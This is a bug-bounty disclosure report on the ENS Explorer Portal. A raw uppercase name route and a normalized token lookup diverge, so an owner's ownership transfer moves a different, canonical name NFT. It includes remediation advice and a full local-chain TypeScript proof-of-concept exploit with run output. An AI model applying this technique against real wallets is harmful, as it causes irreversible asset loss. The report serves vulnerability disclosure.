# 91150 w a critical explorer replaces the displayed ensv2 asset s erc 1155 tokenid before the connected wallet transfer

**Submitted on Aug 30th 2026 at 07:39:18 UTC by @crypt0n1337 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91150
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

The Explorer transfer route uses the decoded route parameter in two incompatible ways:

1. `getEnsOwner(name)` sends the **raw** DNS packet to UniversalResolverV2. For `/VICTIM.eth/ownership/transfer`, it authorizes against the actual raw uppercase `VICTIM` token.
2. The sidebar and transaction label retain and display raw `VICTIM.eth`.
3. `useCanTransferName` and `useTransferName` call `getLabel(name)`, which runs ENS normalization. `VICTIM.eth` becomes `victim`.
4. `getEnsTokenId` then hashes `victim` and retrieves the token ID for the victim's distinct lowercase `victim.eth` token.
5. The final production helper encodes `safeTransferFrom(victim, recipient, lowercaseTokenId, 1, 0x)` while its transaction name still says `VICTIM.eth`.

ENSv2's audited public registrar accepts the two labels as separate tokens. `StandardRentPriceOracle.isValid()` explicitly does not check normalization, and `ETHRegistrar.register()` accepts an arbitrary non-empty label and an arbitrary nonzero owner. Therefore an ordinary attacker can pay to register raw `VICTIM` directly to a victim who already owns canonical `victim`, without victim delegation or registrar privileges.

When the connected owner later uses Explorer's normal ownership-transfer page for displayed `VICTIM.eth` and enters any valid non-self recipient, Explorer labels and authorizes the raw token but submits the canonical token's ID. The transaction succeeds: canonical `victim.eth` moves to the recipient while raw `VICTIM.eth` remains with the owner.

## Actor and state graph

```
ordinary attacker
  |
  | public ETHRegistrar.commit/register("VICTIM", owner=victim)
  | attacker pays; victim grants no role/approval
  v
victim owns both distinct tokens
  - raw      VICTIM.eth  -> token R
  - canonical victim.eth -> token C

victim opens /VICTIM.eth/ownership/transfer
  raw owner lookup + sidebar -> token R / "VICTIM.eth"
  normalized role/token lookup -> token C / "victim"
  victim enters any valid non-self recipient and approves Transfer ownership
  safeTransferFrom(victim, recipient, C, 1, 0x)

post-state
  token R owner = victim
  token C owner = recipient
```

The attacker cannot force the wallet signature or prefill the recipient. This report relies on a prompted but ordinary user interaction with an actual token owned by the victim. It does not rely on phishing, a compromised account, privileged address, browser bug, timing race, or hidden recipient prefill.

## Root cause and exact production path

### 1. Raw route is accepted and authorized

`apps/portal/src/routes/$name.tsx` does not reject a non-normalized route. It passes `name` to `ProfileSidebar` at line 65.

`apps/portal/src/routes/$name/ownership/transfer.tsx`:

* reads the decoded raw parameter at line 22;
* queries `getEnsOwnerQueryOptions({ name })` at line 27;
* passes the same raw `name` through `AuthorizedTransfer` at lines 106-107;
* passes it to `SendNameForm` at line 196.

`resolveEnsOwner` calls ENSjs V2 owner and registry discovery with this string. ENSjs `getOwner.ts:53` encodes `packetToBytes(name)` directly. There is no normalization in that owner lookup. Thus the route correctly observes that the victim owns the raw uppercase token and renders the authorized form.

### 2. Raw name remains visible

`apps/portal/src/components/ProfileSidebar.tsx:210` renders `{name}` directly. For this route it shows `VICTIM.eth`.

`apps/portal/src/features/transfer/hooks/useTransferName.ts:177` also retains the route parameter in the transaction label:

```ts
transactionName: `${STEP_LABELS[step]} - ${name}`
```

### 3. Permission and token identity silently normalize

`apps/portal/src/utils/token/getLabel.ts:10-12` calls `ens_normalize(name)` and then takes the first normalized label.

Both relevant transfer paths call it:

* `useCanTransferName.ts:59` checks transfer permission for `getLabel(name)`;
* `useTransferName.ts:112-114` calls `getEnsTokenId` with `label: getLabel(name)`.

ENSjs `getTokenId.ts:43` computes `labelhash(label)`, so the normalized label selects the lowercase token. The permission check also passes because the victim legitimately has the transfer role on their canonical token.

### 4. Final sink transfers the selected canonical token

`apps/portal/src/features/transfer/helpers/transferToken.ts:69` encodes ERC-1155 `safeTransferFrom` with the prepared token ID. There is no final comparison between:

* the raw name used for authorization/display;
* the token ID derived from normalized `getLabel(name)`; and
* the exact raw token ID in the registry.

## Preconditions and normal sequence

{% stepper %}
{% step %}

### Victim owns canonical `victim.eth` in ENSv2

{% endstep %}

{% step %}

### Raw uppercase `VICTIM` is available as a separate ENSv2 label

{% endstep %}

{% step %}

### Attacker registers `VICTIM`

Attacker uses the public commit/reveal registrar and pays to register `VICTIM` with `owner=victim`, `subregistry=0`, and `resolver=0`.
{% endstep %}

{% step %}

### Victim opens the production route

Victim opens `/VICTIM.eth/ownership/transfer` while connected as its owner.
{% endstep %}

{% step %}

### The fixture produces only `transfer-token`

The fixture gives the raw token no resolver, address record, or subregistry. Supplying the corresponding effective UI options (all detach/repoint flags false) produces exactly `['transfer-token']`. The PoC does not claim to render the React option hook dynamically.
{% endstep %}

{% step %}

### Victim enters a recipient and approves the transfer

Victim types any valid non-self recipient and approves the transfer.
{% endstep %}
{% endstepper %}

The URL alone does not fill step 6. A report should not describe this as a zero-click theft or claim that the attacker can silently choose a recipient.

## Impact

The exact primary impact is a malicious connected-wallet interaction through transaction-argument substitution. The owner intends to transfer displayed raw token R to the typed recipient; Portal silently replaces the ERC-1155 `tokenId` with canonical token C. The mismatch is independent of recipient identity and is complete when the successful transaction moves C while R remains.

If the selected recipient is attacker-controlled, the same execution additionally causes direct theft of C. With any other non-self recipient, the canonical NFT still leaves the owner and recovery requires that recipient's cooperation. The attacker cannot force the signature or prefill the recipient, and this report does not rely on either claim.

The consequence is concrete and irreversible at the registry level, but the likelihood is constrained:

* attacker can create the raw token without victim cooperation;
* attacker cannot prefill the Portal recipient from the URL;
* victim must deliberately enter a recipient and sign the transfer;
* the affected action is Explorer's prompted owner-only Transfer ownership workflow, not an unprompted action outside a normal workflow;
* no claim relies on phishing, an attacker message/link, or deterministic dashboard surfacing of the raw/canonical pair.

This remains a BUG with a demonstrated different-NFT transfer. The significant user interaction should be disclosed for likelihood and any severity downgrade, but it does not turn the proven state transition into an Insight.

## Exact dedupe analysis

### User report #89465

Same family, different direction and sink:

|                  | #89465                                | This report                                                                       |
| ---------------- | ------------------------------------- | --------------------------------------------------------------------------------- |
| Display/context  | normalized renewal name               | raw transfer route/name                                                           |
| Payload identity | raw renewal label                     | normalized token ID                                                               |
| Sink             | registrar `renew(rawLabel)`           | registry ERC-1155 `safeTransferFrom(canonicalTokenId)`                            |
| Direct result    | victim pays to renew wrong raw name   | victim transfers a distinct canonical NFT                                         |
| Fix              | bind renewal display to renewal label | reject raw transfer routes or bind owner/display/role/token ID to one exact label |

Fixing the renewal component does not fix the Explorer transfer hook. This is not a cosmetic second route to the same renewal call.

### EXP-INPUT-005

The public known issue says validators accept names that ENS normalization can reject **or transform**, with the stated practical consequence limited to homograph-style UI confusion. The scope expressly preserves new consequences of a listed root that materially change severity.

That exception is the eligibility basis here: raw owner/registry selection and normalized token selection diverge, the ERC-1155 `tokenId` argument is replaced, and `safeTransferFrom` successfully transfers a separate NFT. The normalization-family overlap is disclosed; the executed state-changing consequence and severity change distinguish this BUG from the listed Medium UI confusion.

### Other corpus checks

* No exact transfer-token normalization issue was found in the frozen public issue/PR search.
* Local reports `#90921`, `#90958`, `#90071`, and `#90130` concern different roots and sinks.
* Public renewal and generic display-confusion material was treated as family risk, not ignored.

## Recommended remediation

The state-changing transfer route must use one exact identity end-to-end.

{% stepper %}
{% step %}

### Reject non-normalized route parameters

Reject non-normalized `/$name/ownership/transfer` route parameters before owner, role, or transaction preparation and show a clear non-actionable warning. Do not silently redirect a raw token page to another token.
{% endstep %}

{% step %}

### Preserve exact raw token identity where raw tokens are intentionally supported

For any intentional support of non-normalized legacy/raw ENSv2 tokens, derive the exact raw first-label hash/token ID once and carry it from owner resolution through role checks, review, and calldata. Do not call a normalizing helper midway.
{% endstep %}

{% step %}

### Assert the identity before opening the wallet

Immediately before opening the wallet, assert that the token ID maps back to the same exact raw label and current owner displayed by the route.
{% endstep %}

{% step %}

### Add regression tests

Add regression tests with two simultaneously owned labels that normalize to the same string (`VICTIM` and `victim`) and assert both calldata and post-state.
{% endstep %}
{% endstepper %}

The same audit should be applied to resolver/subregistry detach helpers because they also receive `getLabel(name)` in the transfer flow, although the included PoC deliberately uses no detach targets so those steps cannot mask this root.

## References

* Frozen Explorer source: <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* ENS competition scope and known-issue exception: <https://immunefi.com/audit-competition/audit-competition-ens/scope/>
* Competition duplicate policy: <https://immunefi.com/audit-competition/audit-competition-ens/information/>

## Proof of Concept

## Deterministic PoC

Artifact: `poc.ts`

The test is a frozen-source-backed production-module/EVM PoC, not a full rendered-browser E2E. Its fetch guard permits only `http://127.0.0.1:18545`. It deploys and exercises actual audited ENSv2 contracts, then runs frozen production Portal modules.

It proves all of the following in one execution:

{% stepper %}
{% step %}

### Deploy audited contracts

Deploys the audited `PermissionedRegistry` root -> `.eth` tree.
{% endstep %}

{% step %}

### Deploy registration stack

Deploys actual `StandardRentPriceOracle`, `ETHRegistrar`, and a local payment token.
{% endstep %}

{% step %}

### Register canonical and raw labels

Victim registers `victim`; external attacker separately commits and registers uppercase `VICTIM` with `owner=victim`. The registrar transaction succeeds and charges the attacker.
{% endstep %}

{% step %}

### Deploy and configure the resolver

Deploys actual `UniversalResolverV2` and injects only the local RPC client into frozen Portal reads.
{% endstep %}

{% step %}

### Verify the raw route owner lookup

Calls production `getEnsOwner({ name: 'VICTIM.eth' })` and proves it returns the victim and raw token's registry.
{% endstep %}

{% step %}

### Verify normalization selects a different token

Calls production `getLabel` and `getEnsTokenId`; it proves:

```
getLabel("VICTIM.eth") = "victim"
raw token ID       = 28168722816495565986509041071453428377751345351602849796876310005537067499520
selected token ID  = 54610711874010270486459574547387192152578608100568658919478837675018332143616
```

{% endstep %}

{% step %}

### Verify the transfer plan

Calls production `buildTransferPlan` with the fixture's no-detach/no-repoint effective options and obtains only `['transfer-token']`.
{% endstep %}

{% step %}

### Execute the transfer

Calls the real frozen `transferToken` through the actual transaction manager and waits for a local-chain receipt.
{% endstep %}

{% step %}

### Decode submitted calldata

Decodes the submitted calldata as:

```
safeTransferFrom(
  0x90F79bf6EB2c4f870365E785982E1f101E93b906,
  0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC,
  54610711874010270486459574547387192152578608100568658919478837675018332143616,
  1,
  0x
)
```

{% endstep %}

{% step %}

### Verify post-state

Reads real post-state: raw uppercase token remains with the victim; canonical lowercase token is owned by the recipient.
{% endstep %}
{% endstepper %}

### Negative control

The same production flow transfers normalized `control.eth`:

* displayed label: `control.eth`;
* selected token ID equals the registry's exact `control` token ID;
* only that displayed token moves;
* the raw uppercase token still remains with the victim.

This rules out a generic problem in the test registrar, ERC-1155 helper, or transaction manager. The failure requires the raw-route/normalized-token differential.

## Run

{% tabs %}
{% tab title="PowerShell terminal 1" %}

```powershell
Set-Location D:\Pentest\bb\ens-contracts-v2\contracts
.\node_modules\.bin\hardhat.cmd node --hostname 127.0.0.1 --port 18545
```

{% endtab %}

{% tab title="PowerShell terminal 2" %}

```powershell
Set-Location D:\Pentest\bb\ens-competition\apps\portal
D:\Pentest\bb\ens-contracts-v2\contracts\node_modules\.bin\tsx.CMD `
  D:\Pentest\bb\ens-audit-notes\findings\portal-raw-normalized-token-transfer\poc.ts
```

{% endtab %}
{% endtabs %}

The Portal working directory is required so its `@/…` TypeScript aliases are resolved exactly as they are in the app build.

Expected exit code: `0`. The final JSON contains `idsAreDifferent: true`, `defaultTransferPlan: ["transfer-token"]`, decoded `safeTransferFrom`, divergent post-state, and the passing normalized control.

The Reown initialization warning is expected: the hermetic fetch guard blocks its optional remote configuration request and the Portal uses local/default values. The transaction manager's IndexedDB warning is also expected in Node; it falls back to its in-memory storage. Neither warning affects the EVM result.

## Full PoC source

```ts
import assert from 'node:assert/strict'
import { readFile } from 'node:fs/promises'
import {
  createPublicClient,
  createWalletClient,
  decodeFunctionData,
  defineChain,
  erc1155Abi,
  http,
  labelhash,
  zeroAddress,
  type Address,
  type Hex,
} from '../../../ens-competition/apps/portal/node_modules/viem/_esm/index.js'
import { privateKeyToAccount } from '../../../ens-competition/apps/portal/node_modules/viem/_esm/accounts/index.js'

const RPC_URL = process.env.ENS_POC_RPC_URL ?? 'http://127.0.0.1:18545'
const allowedRpcOrigin = new URL(RPC_URL).origin
const nativeFetch = globalThis.fetch.bind(globalThis)
let localFetches = 0
let blockedExternalFetches = 0

// Frozen Portal imports initialize production providers. Fail closed if any
// code attempts an HTTP request outside the explicitly configured local EVM.
globalThis.fetch = (async (input, init) => {
  const target =
    typeof input === 'string'
      ? input
      : input instanceof URL
        ? input.href
        : input.url
  const url = new URL(target)
  if (url.origin !== allowedRpcOrigin) {
    blockedExternalFetches += 1
    throw new Error(`Blocked non-local network request: ${url.origin}`)
  }
  localFetches += 1
  return nativeFetch(input, init)
}) as typeof fetch

const CHAIN_ID = 31337
const RAW_LABEL = 'VICTIM'
const NORMALIZED_LABEL = 'victim'
const RAW_NAME = `${RAW_LABEL}.eth`
const NORMALIZED_NAME = `${NORMALIZED_LABEL}.eth`
const CONTROL_LABEL = 'control'
const CONTROL_NAME = `${CONTROL_LABEL}.eth`
const SECRET = `0x${'44'.repeat(32)}` as Hex
const REFERRER = `0x${'00'.repeat(32)}` as Hex
const DURATION = 86_400n

const deployer = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const attacker = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
)
const recipient = privateKeyToAccount(
  '0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a',
)
const victim = privateKeyToAccount(
  '0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6',
)

// Frozen RegistryRolesLib values.
const ROLE_REGISTRAR = 1n << 0n
const ROLE_REGISTRAR_ADMIN = ROLE_REGISTRAR << 128n
const ROLE_SET_PARENT = 1n << 8n
const ROLE_CAN_TRANSFER_ADMIN = (1n << 28n) << 128n

type Artifact = { readonly abi: readonly unknown[]; readonly bytecode: Hex }

const hardhatChain = defineChain({
  id: CHAIN_ID,
  name: 'Local ENS semantic-transfer PoC',
  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
  rpcUrls: { default: { http: [RPC_URL] } },
})
const publicClient = createPublicClient({
  chain: hardhatChain,
  transport: http(RPC_URL),
})
const wallet = (account: typeof deployer) =>
  createWalletClient({ account, chain: hardhatChain, transport: http(RPC_URL) })
const deployerWallet = wallet(deployer)
const victimWallet = wallet(victim)

const artifact = async (path: string): Promise<Artifact> =>
  JSON.parse(await readFile(new URL(path, import.meta.url), 'utf8')) as Artifact

const deploy = async (a: Artifact, args: readonly unknown[]) => {
  const hash = await deployerWallet.deployContract({
    abi: a.abi,
    bytecode: a.bytecode,
    args,
  })
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  assert.equal(receipt.status, 'success')
  assert.ok(receipt.contractAddress)
  return receipt.contractAddress
}

const write = async (
  client: ReturnType<typeof wallet>,
  parameters: Parameters<ReturnType<typeof wallet>['writeContract']>[0],
) => {
  const hash = await client.writeContract(parameters)
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  assert.equal(receipt.status, 'success')
  return hash
}

const main = async () => {
  const [nameRouteSource, transferRouteSource, sidebarSource, transferHookSource] =
    await Promise.all([
      readFile(
        new URL(
          '../../../ens-competition/apps/portal/src/routes/$name.tsx',
          import.meta.url,
        ),
        'utf8',
      ),
      readFile(
        new URL(
          '../../../ens-competition/apps/portal/src/routes/$name/ownership/transfer.tsx',
          import.meta.url,
        ),
        'utf8',
      ),
      readFile(
        new URL(
          '../../../ens-competition/apps/portal/src/components/ProfileSidebar.tsx',
          import.meta.url,
        ),
        'utf8',
      ),
      readFile(
        new URL(
          '../../../ens-competition/apps/portal/src/features/transfer/hooks/useTransferName.ts',
          import.meta.url,
        ),
        'utf8',
      ),
    ])
  assert.match(nameRouteSource, /<ProfileSidebar name=\{name\} \/>/)
  assert.match(transferRouteSource, /getEnsOwnerQueryOptions\(\{ name \}\)/)
  assert.match(transferRouteSource, /<SendNameForm name=\{name\}/)
  assert.match(sidebarSource, />\s*\{name\}\s*<\/span>/)
  assert.match(transferHookSource, /label: getLabel\(name\)/)
  assert.match(
    transferHookSource,
    /transactionName: `\$\{STEP_LABELS\[step\]\} - \$\{name\}`/,
  )

  const artifactsRoot = '../../../ens-contracts-v2/contracts/artifacts/'
  const [
    labelStoreArtifact,
    registryArtifact,
    gatewayArtifact,
    universalResolverArtifact,
    tokenArtifact,
    oracleArtifact,
    registrarArtifact,
  ] = await Promise.all([
    artifact(`${artifactsRoot}src/utils/LabelStore.sol/LabelStore.json`),
    artifact(
      `${artifactsRoot}src/registry/PermissionedRegistry.sol/PermissionedRegistry.json`,
    ),
    artifact(
      `${artifactsRoot}lib/ens-contracts/contracts/ccipRead/GatewayProvider.sol/GatewayProvider.json`,
    ),
    artifact(
      `${artifactsRoot}src/universalResolver/UniversalResolverV2.sol/UniversalResolverV2.json`,
    ),
    artifact(`${artifactsRoot}test/mocks/MockERC20.sol/MockERC20.json`),
    artifact(
      `${artifactsRoot}src/registrar/StandardRentPriceOracle.sol/StandardRentPriceOracle.json`,
    ),
    artifact(`${artifactsRoot}src/registrar/ETHRegistrar.sol/ETHRegistrar.json`),
  ])

  const labelStore = await deploy(labelStoreArtifact, [zeroAddress])
  const initialRoles =
    ROLE_REGISTRAR | ROLE_REGISTRAR_ADMIN | ROLE_SET_PARENT
  const rootRegistry = await deploy(registryArtifact, [
    labelStore,
    deployer.address,
    initialRoles,
  ])
  const ethRegistry = await deploy(registryArtifact, [
    labelStore,
    deployer.address,
    initialRoles,
  ])
  const treeExpiry = (await publicClient.getBlock()).timestamp + 31_536_000n
  await write(deployerWallet, {
    account: deployer,
    address: rootRegistry,
    abi: registryArtifact.abi,
    functionName: 'register',
    args: ['eth', deployer.address, ethRegistry, zeroAddress, 0n, treeExpiry],
  })
  await write(deployerWallet, {
    account: deployer,
    address: ethRegistry,
    abi: registryArtifact.abi,
    functionName: 'setParent',
    args: [rootRegistry, 'eth'],
  })

  // Actual audited public registration stack. StandardRentPriceOracle checks
  // only non-empty/<=255-byte length, not ENS normalization.
  const paymentToken = await deploy(tokenArtifact, ['PAY', 18])
  const priceOracle = await deploy(oracleArtifact, [
    deployer.address,
    [1n],
    [],
    1n,
    0n,
    1n,
    0n,
    [{ paymentToken, numer: 1n, denom: 1n }],
  ])
  const registrar = await deploy(registrarArtifact, [
    deployer.address,
    ethRegistry,
    deployer.address,
    priceOracle,
    0n,
    1n,
    10_000n,
    1n,
  ])
  await write(deployerWallet, {
    account: deployer,
    address: ethRegistry,
    abi: registryArtifact.abi,
    functionName: 'grantRootRoles',
    args: [ROLE_REGISTRAR, registrar],
  })

  for (const account of [victim, attacker]) {
    await write(deployerWallet, {
      account: deployer,
      address: paymentToken,
      abi: tokenArtifact.abi,
      functionName: 'mint',
      args: [account.address, 1_000_000n],
    })
    await write(wallet(account), {
      account,
      address: paymentToken,
      abi: tokenArtifact.abi,
      functionName: 'approve',
      args: [registrar, 1_000_000n],
    })
  }

  const register = async (
    caller: typeof victim,
    label: string,
    owner: Address,
  ) => {
    const callerWallet = wallet(caller)
    const commitment = (await publicClient.readContract({
      address: registrar,
      abi: registrarArtifact.abi,
      functionName: 'makeCommitment',
      args: [
        label,
        owner,
        SECRET,
        zeroAddress,
        zeroAddress,
        DURATION,
        REFERRER,
      ],
    })) as Hex
    await write(callerWallet, {
      account: caller,
      address: registrar,
      abi: registrarArtifact.abi,
      functionName: 'commit',
      args: [commitment],
    })
    await publicClient.request({ method: 'evm_increaseTime', params: [2] })
    await publicClient.request({ method: 'evm_mine', params: [] })
    await write(callerWallet, {
      account: caller,
      address: registrar,
      abi: registrarArtifact.abi,
      functionName: 'register',
      args: [
        label,
        owner,
        SECRET,
        zeroAddress,
        zeroAddress,
        DURATION,
        paymentToken,
        REFERRER,
      ],
    })
    return (await publicClient.readContract({
      address: ethRegistry,
      abi: registryArtifact.abi,
      functionName: 'findTokenId',
      args: [label],
    })) as bigint
  }

  // The victim owns canonical lowercase. An ordinary external attacker pays
  // the public registrar to airdrop a distinct uppercase token to the victim.
  const normalizedTokenId = await register(
    victim,
    NORMALIZED_LABEL,
    victim.address,
  )
  const rawTokenId = await register(attacker, RAW_LABEL, victim.address)
  const controlTokenId = await register(victim, CONTROL_LABEL, victim.address)
  assert.notEqual(rawTokenId, normalizedTokenId)
  assert.notEqual(BigInt(labelhash(RAW_LABEL)), BigInt(labelhash(NORMALIZED_LABEL)))

  for (const tokenId of [normalizedTokenId, rawTokenId, controlTokenId]) {
    assert.equal(
      await publicClient.readContract({
        address: ethRegistry,
        abi: registryArtifact.abi,
        functionName: 'ownerOf',
        args: [tokenId],
      }),
      victim.address,
    )
  }

  const gateway = await deploy(gatewayArtifact, [deployer.address, []])
  const localUniversalResolver = await deploy(universalResolverArtifact, [
    rootRegistry,
    gateway,
    zeroAddress,
  ])
  const [{ universalResolverAddress }, { sepoliaWithEns, wagmiConfig }] =
    await Promise.all([
      import(
        '../../../ens-competition/apps/portal/src/lib/constants/universalResolver.ts'
      ),
      import('../../../ens-competition/apps/portal/src/lib/wagmi.ts'),
    ])
  const resolverRuntime = await publicClient.getCode({
    address: localUniversalResolver,
  })
  assert.ok(resolverRuntime)
  await publicClient.request({
    method: 'hardhat_setCode',
    params: [universalResolverAddress, resolverRuntime],
  })
  const ensReadClient = createPublicClient({
    chain: sepoliaWithEns,
    transport: http(RPC_URL),
  })
  Object.defineProperty(wagmiConfig, 'getClient', {
    configurable: true,
    value: () => ensReadClient,
  })

  const [
    { getEnsOwner },
    { getEnsTokenId },
    { getLabel },
    { buildTransferPlan },
    { transferToken },
    { transactionManager },
  ] = await Promise.all([
    import(
      '../../../ens-competition/apps/portal/src/features/profile/hooks/useEnsOwner.ts'
    ),
    import(
      '../../../ens-competition/apps/portal/src/features/profile/hooks/useTokenId.ts'
    ),
    import('../../../ens-competition/apps/portal/src/utils/token/getLabel.ts'),
    import(
      '../../../ens-competition/apps/portal/src/features/transfer/utils/buildTransferPlan.ts'
    ),
    import(
      '../../../ens-competition/apps/portal/src/features/transfer/helpers/transferToken.ts'
    ),
    import(
      '../../../ens-competition/packages/transaction-manager/src/providers/transactionManager.ts'
    ),
  ])

  // Exact raw route owner check used by /$name/ownership/transfer.
  const rawOwnerResult = await getEnsOwner({ name: RAW_NAME })
  assert.equal(rawOwnerResult.isOk(), true)
  const rawOwner = rawOwnerResult._unsafeUnwrap()
  assert.ok(rawOwner)
  assert.equal(rawOwner.owner, victim.address)
  assert.equal(rawOwner.registryAddress.toLowerCase(), ethRegistry.toLowerCase())
  assert.equal(rawOwner.protocolVersion, 'ENSv2')

  // The route/form retains RAW_NAME, but role/token-id paths normalize it.
  const selectedLabel = getLabel(RAW_NAME)
  assert.equal(selectedLabel, NORMALIZED_LABEL)
  const selectedResult = await getEnsTokenId({
    label: selectedLabel,
    registryAddress: ethRegistry,
  })
  assert.equal(selectedResult.isOk(), true)
  const selectedTokenId = selectedResult._unsafeUnwrap()
  assert.equal(selectedTokenId, normalizedTokenId)
  assert.notEqual(selectedTokenId, rawTokenId)
  assert.equal(
    await publicClient.readContract({
      address: ethRegistry,
      abi: registryArtifact.abi,
      functionName: 'hasRoles',
      args: [normalizedTokenId, ROLE_CAN_TRANSFER_ADMIN, victim.address],
    }),
    true,
  )

  const defaultNoOptionsPlan = buildTransferPlan({
    setEthAddress: false,
    detachResolver: false,
    detachRegistry: false,
  })
  assert.deepEqual(defaultNoOptionsPlan, ['transfer-token'])

  // Frozen production transfer helper, real transaction manager, real EVM.
  const tx = await transferToken({
    name: RAW_NAME,
    registryAddress: ethRegistry,
    tokenId: selectedTokenId,
    recipient: recipient.address,
    walletClient: victimWallet,
    publicClient,
    signer: { type: 'eoa', walletClient: victimWallet },
    chainId: CHAIN_ID,
    id: `transfer-${RAW_NAME}-transfer-token`,
  })
  const snapshot = transactionManager.getTransaction(tx.txId)?.getSnapshot()
  assert.equal(snapshot?.value, 'success')
  const request = snapshot?.context.request
  assert.equal(request?.type, 'eoa')
  assert.ok(request && 'data' in request)
  const decoded = decodeFunctionData({ abi: erc1155Abi, data: request.data })
  assert.equal(decoded.functionName, 'safeTransferFrom')
  assert.deepEqual(decoded.args, [
    victim.address,
    recipient.address,
    normalizedTokenId,
    1n,
    '0x',
  ])

  const ownerOf = async (tokenId: bigint) =>
    (await publicClient.readContract({
      address: ethRegistry,
      abi: registryArtifact.abi,
      functionName: 'ownerOf',
      args: [tokenId],
    })) as Address
  const rawOwnerAfter = await ownerOf(rawTokenId)
  const normalizedOwnerAfter = await ownerOf(normalizedTokenId)
  assert.equal(rawOwnerAfter, victim.address)
  assert.equal(normalizedOwnerAfter, recipient.address)

  // Negative control: normalized display and lookup select the same asset.
  const controlResult = await getEnsTokenId({
    label: getLabel(CONTROL_NAME),
    registryAddress: ethRegistry,
  })
  assert.equal(controlResult.isOk(), true)
  const selectedControlTokenId = controlResult._unsafeUnwrap()
  assert.equal(selectedControlTokenId, controlTokenId)
  const controlTx = await transferToken({
    name: CONTROL_NAME,
    registryAddress: ethRegistry,
    tokenId: selectedControlTokenId,
    recipient: attacker.address,
    walletClient: victimWallet,
    publicClient,
    signer: { type: 'eoa', walletClient: victimWallet },
    chainId: CHAIN_ID,
    id: `transfer-${CONTROL_NAME}-transfer-token`,
  })
  assert.equal(await ownerOf(controlTokenId), attacker.address)
  assert.equal(await ownerOf(rawTokenId), victim.address)

  console.log(
    JSON.stringify(
      {
        frozenPortalRoute: `/${RAW_NAME}/ownership/transfer`,
        actors: {
          ordinaryAttackerAndRawNameRegistrant: attacker.address,
          victimAndCanonicalNameOwner: victim.address,
          chosenTransferRecipient: recipient.address,
        },
        contracts: {
          auditedEthRegistry: ethRegistry,
          auditedEthRegistrar: registrar,
          auditedPriceOracle: priceOracle,
          localUniversalResolver,
          portalConfiguredUniversalResolver: universalResolverAddress,
        },
        attackerSetup: {
          caller: attacker.address,
          rawLabelRegistered: RAW_LABEL,
          ownerArgument: victim.address,
          victimDelegationRequired: false,
          attackerPaidRegistration: true,
        },
        routeAuthorization: {
          rawRouteName: RAW_NAME,
          resolvedOwner: rawOwner.owner,
          protocolVersion: rawOwner.protocolVersion,
          registryAddress: rawOwner.registryAddress,
          frozenSourceAssertions: {
            rawParamPassedToOwnerQuery: true,
            rawParamPassedToSendNameForm: true,
            rawParamRenderedInProfileSidebar: true,
            rawParamRetainedInTransactionName: true,
          },
        },
        differential: {
          displayedAndTransactionName: RAW_NAME,
          normalizedName: NORMALIZED_NAME,
          getLabelResult: selectedLabel,
          rawLabelHash: labelhash(RAW_LABEL),
          normalizedLabelHash: labelhash(NORMALIZED_LABEL),
          rawTokenId: rawTokenId.toString(),
          selectedCanonicalTokenId: selectedTokenId.toString(),
          idsAreDifferent: rawTokenId !== selectedTokenId,
          defaultTransferPlan: defaultNoOptionsPlan,
          decodedFunction: decoded.functionName,
          decodedArgs: decoded.args.map((v) =>
            typeof v === 'bigint' ? v.toString() : v,
          ),
          transactionHash: tx.hash,
        },
        realPostState: {
          displayedRawTokenOwner: rawOwnerAfter,
          valuableCanonicalTokenOwner: normalizedOwnerAfter,
        },
        negativeControl: {
          displayedName: CONTROL_NAME,
          selectedTokenId: selectedControlTokenId.toString(),
          actualTokenId: controlTokenId.toString(),
          finalOwner: await ownerOf(controlTokenId),
          transactionHash: controlTx.hash,
        },
        networkPolicy: {
          allowedOrigin: allowedRpcOrigin,
          externalHttpRequestsSent: 0,
          blockedExternalFetchAttempts: blockedExternalFetches,
          localHttpRequests: localFetches,
        },
      },
      null,
      2,
    ),
  )
  transactionManager.clear()
  process.exit(0)
}

void main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
```

## Captured successful run

```
Frozen Portal commit: cda79acaad59711b943fc68207ebb3f1d0ff8596
Audited ENSv2 contract artifact checkout: 48b3e2d39513b9dd32ef1850877a29009bc807b9
PoC execution date: 2026-08-30 Europe/Moscow
PoC exit code: 0

Command:
Set-Location D:\Pentest\bb\ens-competition\apps\portal
D:\Pentest\bb\ens-contracts-v2\contracts\node_modules\.bin\tsx.CMD D:\Pentest\bb\ens-audit-notes\findings\portal-raw-normalized-token-transfer\poc.ts

Required working directory: D:\Pentest\bb\ens-competition\apps\portal
Independent rerun from that directory: exit code 0 with the exact differential/post-state JSON.

Key deterministic output:
- route: /VICTIM.eth/ownership/transfer
- external attacker registered raw label VICTIM with owner=victim through actual ETHRegistrar
- victim delegation required: false
- getLabel(VICTIM.eth): victim
- raw token ID: 28168722816495565986509041071453428377751345351602849796876310005537067499520
- selected canonical token ID: 54610711874010270486459574547387192152578608100568658919478837675018332143616
- IDs different: true
- default transfer plan: [transfer-token]
- decoded function: safeTransferFrom
- decoded token ID: 54610711874010270486459574547387192152578608100568658919478837675018332143616
- post-state raw VICTIM token owner: victim (0x90F79bf6EB2c4f870365E785982E1f101E93b906)
- post-state canonical victim token owner: recipient (0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC)
- normalized control selected ID == actual control ID: true
- normalized control final owner: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
- HTTP policy: local RPC only; 0 external HTTP requests sent

Expected non-fatal warnings:
- optional Reown remote config is blocked by the hermetic fetch guard
- IndexedDB is unavailable in Node; transaction persistence falls back to memory
```

